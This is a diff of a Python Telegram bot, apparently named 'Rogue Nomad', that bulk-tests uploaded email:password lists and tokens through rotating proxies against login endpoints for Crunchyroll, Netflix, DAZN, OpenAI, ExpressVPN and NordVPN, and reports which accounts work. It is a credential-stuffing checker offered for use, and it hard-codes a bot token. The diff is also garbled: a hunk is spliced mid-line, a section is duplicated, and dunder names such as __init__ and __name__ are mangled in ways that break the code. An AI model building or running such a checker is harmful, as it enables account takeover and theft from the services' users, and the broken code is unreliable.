@@ -24,6 +24,10 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Mess
 from telegram.constants import ParseMode
 import aiohttp
 import aiosqlite
+
+# ============================================
+# CONFIGURATION - YOUR CREDENTIALS
+# ============================================
 BOT_TOKEN = "8279300523:AAGC71G8Dd9QmmF2Yhn6MUSTKq7i-4q6p7w"
 ADMIN_ID = 1875307475
 DATABASE_URL = "rogue_nomad.db"
@@ -34,12 +38,19 @@ BOT_NAME = "Rogue Nomad"
 BOT_VERSION = "v3.0"
 PORT = int(os.environ.get("PORT", 10000))
 
+# ============================================
+# LOGGING SETUP
+# ============================================
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=getattr(logging, LOG_LEVEL)
+    datefmt="%d-%b-%Y %H:%M:%S",
+    level=logging.INFO
 )
-logger = logging.getLogger(__name__)
+logger = logging.getLogger(name)
 
+# ============================================
+# DATABASE INITIALIZATION
+# ============================================
 INIT_DB = """
 CREATE TABLE IF NOT EXISTS proxies (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -101,8 +112,11 @@ async def get_db():
         await db.commit()
         yield db
 
+# ============================================
+# PROXY MANAGER
+# ============================================
 class ProxyManager:
-    def __init__(self):
+    def init(self):
         self._cache = []
         self._cache_time = 0
         self._cache_ttl = 60
@@ -188,6 +202,9 @@ class ProxyManager:
                 "alive": alive[0][0] if alive else 0
             }
 
+# ============================================
+# SERVICE CHECKERS
+# ============================================
 class ServiceCheckers:
     @staticmethod
     async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
@@ -219,7 +236,96 @@ class ServiceCheckers:
     async def check_netflix_token(token: str, proxy: Optional[str] = None) -> Dict:
         try:
             async with aiohttp.ClientSession() as session:
-                headers = {
+                headers = {6"
+                }
+                async with session.get(
+                    "https://www.netflix.com/api/shakti/viper/metadata",
+                    headers=headers,
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                ) as resp:
+                    if resp.status == 200:
+                        return {"valid": True, "status": "active"}
+                    return {"valid": False, "status": "expired"}
+        except:
+            return {"valid": False, "status": "error"}
+    
+    @staticmethod
+    async def check_dazn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.post(
+                    "https://login.dazn.com/v1/auth/login",
+                    json={"email": email, "password": password},
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                ) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        return {"valid": True, "status": "active", "region": data.get("region", "Unknown")}
+                    return {"valid": False, "status": "invalid"}
+        except:
+            return {"valid": False, "status": "error"}
+    
+    @staticmethod
+    async def check_openai_token(token: str, proxy: Optional[str] = None) -> Dict:
+        try:
+            async with aiohttp.ClientSession() as session:
+                headers = {"Authorization": f"Bearer {token}"}
+                async with session.get(
+                    "https://api.openai.com/v1/models",
+                    headers=headers,
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                ) as resp:
+                    if resp.status == 200:
+                        return {"valid": True, "status": "active", "tier": "paid"}
+                    return {"valid": False, "status": "invalid"}
+        except:
+            return {"valid": False, "status": "error"}
+    
+    @staticmethod
+    async def check_expressvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.post(
+                    "https://www.expressvpn.com/api/v1/auth/login",
+                    json={"email": email, "password": password},
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                ) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        return {"valid": True, "status": "active", "plan": data.get("plan", "Unknown")}
+                    return {"valid": False, "status": "invalid"}
+        except:
+            return {"valid": False, "status": "error"}
+    
+    @staticmethod
+    async def check_nordvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.post(
+                    "https://api.nordvpn.com/v1/users/login",
+                    json={"email": email, "password": password},
+                    proxy=proxy,
+                    timeout=aiohttp.ClientTimeout(total=10)
+                ) as resp:
+                    if resp.status == 200:
+                        return {"valid": True, "status": "active"}
+                    return {"valid": False, "status": "invalid"}
+        except:
+            return {"valid": False, "status": "error"}
+
+# ============================================
+# CHECKER ENGINE
+# ============================================
+class CheckerEngine:
+    def init(self, proxy_manager: ProxyManager):
+        self.proxy_manager = proxy_manager
+        self.services = {
+            "crunchyroll": {"checker": ServiceCheckers.check_crunchyroll, "type": "email:pass", "label": "🍿 Crunchyroll"},
+            "netflix": {"checker": ServiceCheckers.check_netflix_token, "type"
                     "Authorization": f"Bearer {token}",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                 }
@@ -302,8 +408,11 @@ class ServiceCheckers:
         except:
             return {"valid": False, "status": "error"}
 
+# ============================================
+# CHECKER ENGINE
+# ============================================
 class CheckerEngine:
-    def __init__(self, proxy_manager: ProxyManager):
+    def init(self, proxy_manager: ProxyManager):
         self.proxy_manager = proxy_manager
         self.services = {
             "crunchyroll": {"checker": ServiceCheckers.check_crunchyroll, "type": "email:pass", "label": "🍿 Crunchyroll"},
@@ -395,6 +504,9 @@ class CheckerEngine:
     def get_stats(self) -> Dict:
         return self.stats
 
+# ============================================
+# TELEGRAM BOT - INITIALIZE
+# ============================================
 proxy_manager = ProxyManager()
 checker_engine = CheckerEngine(proxy_manager)
 
@@ -413,6 +525,9 @@ SERVICE_CATEGORIES = {
     }
 }
 
+# ============================================
+# COMMAND HANDLERS
+# ============================================
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     welcome_text = f"""
@@ -502,8 +617,8 @@ async def handle_service_selection(update: Update, context: ContextTypes.DEFAULT
     await query.edit_message_text(
         f"🔍 *Checking {label}*\n\n"
         f"Send credentials (one per line):\n"
-        f"• `{cred_type}`\n"
-        f"• Or upload a `.txt` file\n\n"
+        f"• {cred_type}\n"
+        f"• Or upload a .txt file\n\n"
         f"🌐 Proxy: {'✅ ON' if context.user_data.get('use_proxy', True) else '❌ OFF'}",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=InlineKeyboardMarkup([
@@ -584,10 +699,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     summary = f"""
 📊 *Check Complete*
-Service: `{service}`
-Total: `{len(results)}`
-✅ Valid: `{len(valid)}`
-❌ Invalid: `{len(invalid)}`
+Service: {service}
+Total: {len(results)}
+✅ Valid: {len(valid)}
+❌ Invalid: {len(invalid)}
 """
     await update.message.reply_text(summary, parse_mode=ParseMode.MARKDOWN)
     await status_msg.delete()
@@ -681,10 +796,10 @@ async def show_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     
     text = f"""
 📊 *Statistics*
-Total: `{stats['total']}`
-✅ Valid: `{stats['valid']}`
-❌ Invalid: `{stats['invalid']}`
-🌐 Proxies: `{proxy_stats['alive']}/{proxy_stats['total']}`
+Total: {stats['total']}
+✅ Valid: {stats['valid']}
+❌ Invalid: {stats['invalid']}
+🌐 Proxies: {proxy_stats['alive']}/{proxy_stats['total']}
 """
     await query.edit_message_text(
         text,
@@ -694,62 +809,10 @@ Total: `{stats['total']}`
         ])
     )
 
-flask_app = Flask(__name__)
-
-@flask_app.route('/')
-def health():
-    return f"{BOT_NAME} is running!", 200
-
-@flask_app.route('/health')
-def health_check():
-    return {"status": "ok", "bot": BOT_NAME, "version": BOT_VERSION}, 200
-
-def run_flask():
-    port = int(os.environ.get('PORT', 10000))
-    logger.info(f"🌐 Flask server starting on port {port}")
-    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
-
-def main():
-    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        logger.error("❌ BOT_TOKEN not set!")
-        return
-    
-    app = Application.builder().token(BOT_TOKEN).build()
-    
-    app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("checkers", checkers_command))
-    app.add_handler(CommandHandler("admin", admin_command))
-    app.add_handler(CommandHandler("broadcast", broadcast_command))
-    app.add_handler(CommandHandler("resetstats", reset_stats_command))
-    app.add_handler(CommandHandler("help", start_command))
-    app.add_handler(CommandHandler("about", start_command))
-    
-    app.add_handler(CallbackQueryHandler(handle_category, pattern="^cat_"))
-    app.add_handler(CallbackQueryHandler(handle_service_selection, pattern="^svc_"))
-    app.add_handler(CallbackQueryHandler(toggle_proxy_callback, pattern="^toggle_proxy"))
-    app.add_handler(CallbackQueryHandler(show_stats_callback, pattern="^show_stats"))
-    app.add_handler(CallbackQueryHandler(back_to_start, pattern="^back_start"))
-    app.add_handler(CallbackQueryHandler(checkers_command, pattern="^checkers$"))
-    
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
-    
-    logger.info(f"🚀 {BOT_NAME} {BOT_VERSION} is LIVE!")
-    logger.info(f"📱 Bot: {BOT_USERNAME}")
-    logger.info(f"🔗 Channel: {BOT_LINK}")
-    
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
-
-if __name__ == "__main__":
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    time.sleep(2)
-    main()
-```python
 # ============================================
 # FLASK APP FOR RENDER WEB SERVICE
 # ============================================
-flask_app = Flask(__name__)
+flask_app = Flask(name)
 
 @flask_app.route('/')
 def health():
@@ -798,16 +861,8 @@ def main():
     
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
-# ============================================
-# ENTRY POINT - THIS IS WHERE IT STARTS
-# ============================================
-if __name__ == "__main__":
-    # Start Flask in a background thread (keeps Render happy)
+if name == "main":
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
-    
-    # Wait a moment for Flask to start
     time.sleep(2)
-    
-    # Start the Telegram bot
     main()
